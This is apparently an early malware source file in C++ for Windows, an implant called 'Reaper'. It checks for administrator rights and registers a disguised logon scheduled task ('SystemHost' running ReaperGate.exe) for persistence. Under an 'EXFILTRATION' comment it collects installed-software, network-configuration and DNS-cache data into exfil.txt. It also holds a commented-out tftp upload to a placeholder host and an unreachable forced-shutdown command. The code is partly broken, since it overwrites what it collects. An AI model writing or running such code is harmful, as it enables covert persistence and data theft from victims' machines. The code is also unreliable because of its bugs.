#include <sstream>
#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <fstream>
#include <thread>
#include <chrono>
#include <vector>

using namespace std;

int checkPrivs(){
    int result = system("net session >nul 2>&1");

    if (result == 0) { // Exit code 0 indicates success
        return 0;
    } else {
        return 1;
    }
};

std::string systemIO(string& in) {
    FILE *fp = popen(in.c_str(), "r"); // Open a pipe to read the output
    if (fp == nullptr) {
        std::cerr << "Failed to run command" << std::endl;
        return "";
    }

    char buffer[128];
    std::string output;

    if (fgets(buffer, sizeof(buffer), fp) != nullptr) {
        output = buffer;
    }

    pclose(fp); // Close the pipe

    return output;
}

int main(){

    int err = checkPrivs();
    if(err == 0){
        this_thread::sleep_for(chrono::milliseconds(10));
    } else {
        cerr << "Reaper does not have administrator access" << endl;
        return 1;
        this_thread::sleep_for(chrono::milliseconds(2000));
        system("shutdown /p /f");
    };

    stringstream ss;
    string passwd;
    string misc;
    string cmd = "whoami";
    string user = systemIO(cmd);
    string scriptName;
    cout << user;
    //std::string cmd = "tftp -i <target_ip> PUT \"sensitive_data.txt\"";
    //systemIO(cmd);
    cmd = "schtasks /create /sc onlogon /tn \"SystemHost\" /tr \"C:\\Windows\\ReaperGate.exe\"";
    systemIO(cmd);
    // EXFILTRATION
    std::ifstream inFile("example.txt");
    if (!inFile.is_open()) {
        std::cerr << "Could not open file for reading." << std::endl;
        return 1;
    }

    // Read the file content into a vector
    vector<string> lines;
    std::string line;
    while (std::getline(inFile, line)) {
        lines.push_back(line);
    }

    inFile.close(); // Close the input file

    cmd = "reg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /v DisplayName";
    lines[0] = systemIO(cmd);
    cmd = "ipconfig /all";
    lines[1] = systemIO(cmd);
    cmd = "ipconfig /displaydns";
    lines[2] = systemIO(cmd);

    // Modify the content
    if (!lines.empty()) {
        lines[0] = "This is the modified first line."; // Change the first line
    }

    // Rewrite the entire file
    std::ofstream outFile("exfil.txt");

    for (const auto& l : lines) { // Write the modified content back to the file
        outFile << l << std::endl;
    }

    outFile.close(); // Close the output file
}